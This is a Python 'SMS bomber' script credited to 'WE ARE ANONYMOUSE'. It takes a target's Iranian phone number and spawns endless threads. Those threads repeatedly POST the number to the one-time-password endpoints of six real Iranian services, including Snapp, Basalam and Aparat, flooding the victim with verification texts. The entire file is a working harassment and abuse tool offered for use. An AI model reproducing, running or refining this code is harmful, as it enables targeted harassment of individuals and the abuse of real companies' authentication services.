import requests , os , threading

os.system('cls' if os.name == 'nt' else 'clear')
banner = '''
  █████████  ██████   ██████  █████████             ███████████     ███████    ██████   ██████ ███████████  ██████████ ███████████  
 ███░░░░░███░░██████ ██████  ███░░░░░███           ░░███░░░░░███  ███░░░░░███ ░░██████ ██████ ░░███░░░░░███░░███░░░░░█░░███░░░░░███ 
░███    ░░░  ░███░█████░███ ░███    ░░░             ░███    ░███ ███     ░░███ ░███░█████░███  ░███    ░███ ░███  █ ░  ░███    ░███ 
░░█████████  ░███░░███ ░███ ░░█████████  ██████████ ░██████████ ░███      ░███ ░███░░███ ░███  ░██████████  ░██████    ░██████████  
 ░░░░░░░░███ ░███ ░░░  ░███  ░░░░░░░░███░░░░░░░░░░  ░███░░░░░███░███      ░███ ░███ ░░░  ░███  ░███░░░░░███ ░███░░█    ░███░░░░░███ 
 ███    ░███ ░███      ░███  ███    ░███            ░███    ░███░░███     ███  ░███      ░███  ░███    ░███ ░███ ░   █ ░███    ░███ 
░░█████████  █████     █████░░█████████             ███████████  ░░░███████░   █████     █████ ███████████  ██████████ █████   █████
 ░░░░░░░░░  ░░░░░     ░░░░░  ░░░░░░░░░             ░░░░░░░░░░░     ░░░░░░░    ░░░░░     ░░░░░ ░░░░░░░░░░░  ░░░░░░░░░░ ░░░░░   ░░░░░ 
                                                                                                                                    
                                                                                                                                    
                                                                                                                                    '''
print(banner)
print("CREATE BY YASIN BM ... WE ARE ANONYMOUSE")
target = input("Enter target phone number with out +98 : ")

def attack():
    while True:
        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        url2 = "https://auth.basalam.com/otp-request"
        url3 = "https://www.miare.ir/api/otp/driver/request/"
        url4 = "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one"
        url5 = "https://sso.varzesh3.com/account/login?ReturnUrl=/connect/authorize/callback?client_id=0D996589651C4235B7D40837E8C1DBC2F60410B2C9304298B568&redirect_uri=https%3A%2F%2Fwww.varzesh3.com%2Foidc%2Fcallback&response_type=code&scope=openid%20profile%20offline_access%20videos.api%20comments.api%20profile.api%20world-cup.prediction.api%20engagement.api%20notification.api&state=109e9ab5b7884fad9ea691e7050cb178&code_challenge=IAabQgNkPAziQXexg0a8bUB9ttApqtqGvNN8ESaDsU8&code_challenge_method=S256&response_mode=query"
        url6 = "https://www.aparat.com/api/fa/v1/user/Authenticate/country_code?callbackType=postmes"
        number = {"cellphone":target}
        requests.post(url,data=number)
        number2 = {"mobile":target}
        requests.post(url2,data=number2)
        number3 = {"phone_mobile":target}
        requests.post(url3,data=number3)
        number4 = {"phone":target}
        requests.post(url4,data=number4)
        number5 = {"PhoneNumber":target}
        requests.post(url5,data=number5)
        number6 = number2 = {"mobile":target}
        requests.post(url6,data=number6)
        print(f"Bombering this number {target} ====> ")

while True:
    t = threading.Thread(target=attack)
    t.start()
